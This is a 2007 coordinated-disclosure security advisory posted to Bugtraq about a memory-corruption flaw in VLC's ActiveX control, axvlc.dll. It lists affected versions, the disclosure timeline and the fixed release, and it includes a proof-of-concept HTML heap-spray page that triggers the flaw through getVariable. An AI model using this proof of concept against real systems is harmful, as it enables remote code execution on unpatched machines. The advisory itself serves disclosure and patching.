
Date: Tue, 04 Dec 2007 13:26:02 -0300
From: CORE Security Technologies Advisories <advisories@...esecurity.com>
To: Bugtraq <bugtraq@...urityfocus.com>,
	Vulnwatch <vulnwatch@...nwatch.org>
Subject: CORE-2007-1004: VLC Activex Bad Pointer Initialization Vulnerability

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1


       Core Security Technologies â€“ CoreLabs Advisory
            http://www.coresecurity.com/corelabs

    VLC Activex Bad Pointer Initialization Vulnerability

*Advisory Information*
Title: VLC Activex Bad Pointer Initialization Vulnerability
Advisory ID: CORE-2007-1004
Advisory URL: http://www.coresecurity.com/?action=item&id=2035
Date published: 2007-12-04
Date of last update: 2007-12-03
Vendors contacted: VLC
Release mode: Coordinated Release

*Vulnerability Information*
Class: Access validation error
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: N/A
CVE Name: N/A

*Vulnerability Description*
VLC player is a popular multimedia player for various audio and video
formats, and various streaming protocols.

A vulnerability has been found in the ActiveX control DLL (axvlc.dll)
used by VLC player. This library contains three methods whose parameters
are not correctly checked, and may produce a bad initialized pointer. By
providing these functions specially crafted parameters, an attacker can
overwrite memory zones and execute arbitrary code.

*Vulnerable packages*
VLC media player version 0.86, 0.86a, 0.86b y 0.86c.

*Non-vulnerable packages*
VLC media player versions prior to 0.86.
VLC media player version 0.86d.

*Vendor Information, Solutions and Workarounds*
VLC media player 0.8.6d adresses this issue and introduces further
usability fixes.

Download it from the VideoLAN project website: http://www.videolan.org/

*Credits*
This vulnerability was discovered by Ricardo Narvaja (Ricnar) from the
Exploit Writers team of Core Security Technologies.

*Technical Description / Proof of Concept Code*
The ActiveX control DLL (axvlc.dll) contains three methods whose
parameters are not correctly checked, and may produce a bad initialized
pointer. By providing these functions specially crafted parameters, an
attacker can overwrite memory zones and execute arbitrary code.

The vulnerable functions are:

Sub addTarget (
ByVal uri As String ,
ByVal options As Variant ,
ByVal mode As VLCPlaylistMode ,
ByVal Position As Long)

Function getVariable (ByVal name As String)

Sub setVariable (
ByVal name As String ,
ByVal value As Variant)

The parameters declared as String are the cause of the vulnerability.

The following assembly code is where the axvlc.dll library crashes. The
pointer that is read to be executed, can be overwritten, depending on how
the strings are sent. It also requires that previously other files are
loaded that left the pointer bad initialized, with the value that the
attacker needs to jump to his own code.

000113CD    FF50 14         CALL DWORD PTR DS:[EAX+14]
000113D0    8B53 08         MOV EDX,DWORD PTR DS:[EBX+8]
000113D3    85D2            TEST EDX,EDX

The following is a PoC HTML file, using one of the vulnerable methods
(addTarget).

<html>
<head>
<object classid='clsid:E23FE9C6-778E-49D4-B537-38FCDE4887D8'
id='target' ></object>
</head>
<body>
   <script>
      var mm  = null;

      if( target != null )
      {
         var param1 = unescape("%u0505%u0505");
         var salame = "defaultV";
         var salame2 = 1;
         var salame3 = 0;

         ag   = unescape("%uCCCC%uCCCC");
         sh   =
unescape("%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%");
         sz   = sh.length * 2;
         npsz = 0x400000 - (sz + 0x38);
         nps  = unescape("%u0505%u0505");

         while(nps.length * 2 < npsz) nps += nps;
         ihbc = (0x0E000000 - 0x400000) / 0x400000;
         mm   = new Array();

         for(i = 0; i <= ihbc; i++) mm[i] = nps + sh;

         for(var i=0;i<2000;i++)
            param1 = param1 + unescape("%u0505%u0505");
					
         target.getVariable (param1);
      }
   </script>
</body>
</html>


*Additional information*
[1] Practical demonstration of VLC ActiveX vulnerability
http://www.coresecurity.com/files/attachments/CORE-2007-1004-VLC-tutorial.pdf

*Report Timeline*
2007-10-26: Core notifies the VLC team of the vulnerability.
2007-10-29: Technical details sent by Core to VLC.
2007-11-23: VLC notifies Core that a fix has been produced, and will be
released in VLC version 0.8.6d.
2007-11-30: VLC releases version 0.8.6d, which fixes this vulnerability.
2007-12-04: CORE-2007-1004 advisory is published.

*About Corelabs*
CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies.
We conduct our research in several important areas of computer security
including system vulnerabilities, cyber attack planning and simulation,
source code auditing, and cryptography. Our results include problem
formalization, identification of vulnerabilities, novel solutions and
prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
http://www.coresecurity.com/corelabs/

*About Core Security Technologies*
Core Security Technologies develops strategic solutions that help
security-conscious organizations worldwide develop and maintain a
proactive process for securing their networks. The company's flagship
product, CORE IMPACT, is the most comprehensive product for performing
enterprise security assurance testing. IMPACT evaluates network, endpoint
and end-user vulnerabilities and identifies what resources are exposed.
It enables organizations to determine if current security investments are
detecting and preventing attacks. Core augments its leading technology
solution with world-class security consulting services, including
penetration testing and software security auditing. Based in Boston, MA
and Buenos Aires, Argentina, Core Security Technologies can be reached at
617-399-6980 or on the Web at
http://www.coresecurity.com.

*DISCLAIMER*
The contents of this advisory are copyright (c) 2007 CORE Security
Technologies and (c) 2007 CoreLabs, and may be distributed freely
provided that no fee is charged for this distribution and proper credit
is given.

*PGP/GPG KEYS*
This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at
http://www.coresecurity.com/files/attachments/core_security_advisories.asc


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)

iD8DBQFHVX+ayNibggitWa0RAuaNAJ9TKYfpopNcnuAwycq9wqKeacoGggCgnrxn
J8l/kRHXfxvHQ0lFJIbvRkk=
=gYOg
-----END PGP SIGNATURE-----
